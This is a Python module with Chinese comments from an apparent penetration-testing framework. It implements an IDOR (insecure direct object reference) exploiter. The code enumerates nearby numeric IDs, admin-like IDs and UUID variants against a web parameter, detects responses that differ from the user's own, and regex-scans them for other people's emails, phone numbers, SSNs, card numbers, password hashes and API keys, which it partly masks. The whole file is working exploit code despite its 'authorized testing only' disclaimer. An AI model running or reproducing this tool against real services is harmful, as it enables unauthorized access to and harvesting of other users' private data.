#!/usr/bin/env python3
"""
IDOR 利用器 - 不安全的直接对象引用漏洞利用

支持场景:
- 数字ID遍历 (user_id=1,2,3...)
- UUID/GUID枚举
- 参数篡改 (替换当前用户ID为其他用户)
- 水平越权 (访问其他用户数据)
- 垂直越权 (访问管理员资源)

警告: 本工具仅用于授权安全测试
"""

import logging
import re
import time
from typing import Any, Dict, List, Optional, Tuple

from ..engine import (
    BaseExploiter,
    ExploitResult,
    ExploitStatus,
    ExploitType,
    register_exploiter,
)

logger = logging.getLogger(__name__)


@register_exploiter(["idor", "insecure_direct_object_reference", "broken_access_control"])
class IDORExploiter(BaseExploiter):
    """不安全的直接对象引用利用器"""

    name = "idor_exploiter"
    supported_vuln_types = ["idor", "insecure_direct_object_reference", "broken_access_control"]
    exploit_type = ExploitType.DATA_EXTRACTION

    # 常见的ID参数名
    ID_PARAMS = [
        "id",
        "user_id",
        "userId",
        "uid",
        "account_id",
        "accountId",
        "order_id",
        "orderId",
        "doc_id",
        "docId",
        "file_id",
        "fileId",
        "customer_id",
        "customerId",
        "profile_id",
        "profileId",
        "record_id",
        "recordId",
        "item_id",
        "itemId",
    ]

    # 敏感数据模式
    SENSITIVE_PATTERNS = {
        "email": r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}",
        "phone": r"(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}",
        "ssn": r"\d{3}-\d{2}-\d{4}",
        "credit_card": r"\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}",
        "address": r"\d+\s+[\w\s]+(?:street|st|avenue|ave|road|rd|drive|dr|lane|ln)",
        "password_hash": r"(\$2[aby]?\$\d+\$|^\{SHA\}|^\{SSHA\}|^\$\d+\$)",
        "api_key": r'(?:api[_-]?key|apikey|api_secret)["\']?\s*[:=]\s*["\']?[\w-]{20,}',
    }

    def exploit(
        self, detection_result: Any, targets: Optional[Dict[str, Any]] = None, **kwargs
    ) -> ExploitResult:
        """
        执行IDOR利用

        Args:
            detection_result: 漏洞检测结果
            targets: 利用目标配置
                - test_ids: 要测试的ID列表
                - id_range: ID范围 (start, end)
                - max_requests: 最大请求数
        """
        start_time = time.time()

        # 提取检测信息
        url = getattr(detection_result, "url", "")
        param = getattr(detection_result, "param", "")
        original_value = getattr(detection_result, "payload", "")
        extra = getattr(detection_result, "extra", {}) or {}

        if not url or not param:
            return self._create_result(
                status=ExploitStatus.NOT_APPLICABLE,
                vuln_type="idor",
                url=url,
                error="缺少URL或参数信息",
            )

        # 获取配置
        targets = targets or {}
        timeout = targets.get("timeout", 30)
        max_requests = targets.get("max_requests", 20)

        # 生成测试ID列表
        test_ids = self._generate_test_ids(original_value, targets)

        logger.info(f"[IDORExploiter] 开始利用 URL={url}, param={param}, 测试ID数: {len(test_ids)}")

        # 首先获取基准响应
        baseline = self._get_baseline_response(url, param, original_value, timeout)

        # 枚举其他ID
        leaked_data = []
        accessed_ids = []

        for test_id in test_ids[:max_requests]:
            if str(test_id) == str(original_value):
                continue  # 跳过原始值

            result = self._probe_id(url, param, test_id, baseline, timeout)
            if result["success"]:
                accessed_ids.append(test_id)

                # 提取敏感数据
                sensitive = self._extract_sensitive_data(result["response"])
                if sensitive:
                    leaked_data.append(
                        {
                            "id": test_id,
                            "sensitive_data": sensitive,
                            "response_preview": result["response"][:500],
                        }
                    )

                logger.info(f"[IDORExploiter] 成功访问ID: {test_id}")

                # 如果找到足够数据，可以提前停止
                if len(accessed_ids) >= 5:
                    break

        execution_time = (time.time() - start_time) * 1000

        if accessed_ids:
            return self._create_result(
                status=ExploitStatus.SUCCESS,
                vuln_type="idor",
                url=url,
                data={
                    "accessed_ids": accessed_ids,
                    "total_accessed": len(accessed_ids),
                    "leaked_data": leaked_data,
                    "sensitive_count": len(leaked_data),
                },
                evidence=f"成功访问 {len(accessed_ids)} 个其他用户/对象的数据",
                execution_time_ms=execution_time,
                metadata={
                    "param": param,
                    "original_id": original_value,
                    "test_range": f"{test_ids[0]}-{test_ids[-1]}" if test_ids else "",
                },
            )
        else:
            return self._create_result(
                status=ExploitStatus.FAILED,
                vuln_type="idor",
                url=url,
                error="IDOR利用失败，未能访问其他对象",
                execution_time_ms=execution_time,
                metadata={"param": param},
            )

    def _generate_test_ids(self, original_value: str, targets: Dict[str, Any]) -> List[Any]:
        """生成测试ID列表"""
        test_ids = []

        # 优先使用配置的ID列表
        if "test_ids" in targets:
            return targets["test_ids"]

        # 检测原始值的类型
        try:
            original_int = int(original_value)
            # 数字ID - 生成周围的值
            id_range = targets.get("id_range", (1, 100))
            start, end = id_range

            # 原始值附近
            for i in range(-5, 6):
                test_id = original_int + i
                if test_id > 0:
                    test_ids.append(test_id)

            # 常见管理员ID
            test_ids.extend([1, 2, 0, -1])

            # 范围内的其他值
            for i in range(start, min(end, start + 20)):
                if i not in test_ids:
                    test_ids.append(i)

        except ValueError:
            # 非数字ID (可能是UUID或字符串)
            if "-" in original_value and len(original_value) == 36:
                # UUID格式 - 尝试常见变体
                test_ids = self._generate_uuid_variants(original_value)
            else:
                # 字符串ID - 尝试常见值
                test_ids = ["admin", "root", "test", "user", "1", "2", "0", "guest"]

        # 去重并限制数量
        seen = set()
        unique_ids = []
        for id_val in test_ids:
            if str(id_val) not in seen:
                seen.add(str(id_val))
                unique_ids.append(id_val)

        return unique_ids[:50]  # 最多50个

    def _generate_uuid_variants(self, uuid_str: str) -> List[str]:
        """生成UUID变体"""
        variants = []

        # 修改最后几位
        base = uuid_str[:-4]
        for i in range(10):
            variants.append(f"{base}{i:04d}")

        # 常见特殊UUID
        variants.extend(
            [
                "00000000-0000-0000-0000-000000000000",
                "00000000-0000-0000-0000-000000000001",
                "11111111-1111-1111-1111-111111111111",
            ]
        )

        return variants

    def _get_baseline_response(
        self, url: str, param: str, value: str, timeout: int
    ) -> Dict[str, Any]:
        """获取基准响应"""
        # 使用统一的HTTP客户端
        result = self.exploit_http.send_get_with_payload(url, param, value, timeout)
        if result["success"]:
            return {
                "length": len(result["response"]),
                "status_code": result["status_code"],
                "content_hash": hash(result["response"][:1000]),
            }
        return {}

    def _probe_id(
        self, url: str, param: str, test_id: Any, baseline: Dict[str, Any], timeout: int
    ) -> Dict[str, Any]:
        """探测单个ID"""
        # 使用统一的HTTP客户端
        result = self.exploit_http.send_get_with_payload(url, param, str(test_id), timeout)

        if not result["success"]:
            return {"success": False}

        response = result["response"]
        status_code = result["status_code"]

        # 判断是否成功访问了不同的数据
        if not baseline:
            # 无基准时，只检查成功状态码
            if status_code == 200 and len(response) > 50:
                return {"success": True, "response": response}
            return {"success": False}

        # 检查响应是否不同于基准
        is_different = (
            status_code == 200
            and len(response) > 50
            and (
                abs(len(response) - baseline.get("length", 0)) > 100
                or hash(response[:1000]) != baseline.get("content_hash")
            )
        )

        # 排除错误页面
        error_indicators = ["error", "not found", "unauthorized", "forbidden", "denied"]
        has_error = any(ind in response.lower()[:500] for ind in error_indicators)

        if is_different and not has_error:
            return {"success": True, "response": response}

        return {"success": False}

    def _extract_sensitive_data(self, response: str) -> Dict[str, List[str]]:
        """提取敏感数据"""
        sensitive = {}

        for data_type, pattern in self.SENSITIVE_PATTERNS.items():
            matches = re.findall(pattern, response, re.IGNORECASE)
            if matches:
                # 去重并限制数量
                unique_matches = list(set(matches))[:5]
                # 部分遮蔽敏感数据
                masked = [self._mask_sensitive(m, data_type) for m in unique_matches]
                sensitive[data_type] = masked

        return sensitive

    def _mask_sensitive(self, value: str, data_type: str) -> str:
        """遮蔽敏感数据"""
        if not value:
            return value

        if data_type == "email":
            parts = value.split("@")
            if len(parts) == 2:
                return f"{parts[0][:2]}***@{parts[1]}"

        if data_type == "phone":
            if len(value) >= 10:
                return f"{value[:3]}****{value[-4:]}"

        if data_type == "credit_card":
            digits = re.sub(r"\D", "", value)
            if len(digits) >= 12:
                return f"{digits[:4]}********{digits[-4:]}"

        if data_type == "ssn":
            return f"***-**-{value[-4:]}"

        # 默认遮蔽中间部分
        if len(value) > 6:
            return f"{value[:3]}***{value[-3:]}"

        return "***"


def register_idor_exploiter():
    """注册IDOR利用器"""
    return IDORExploiter
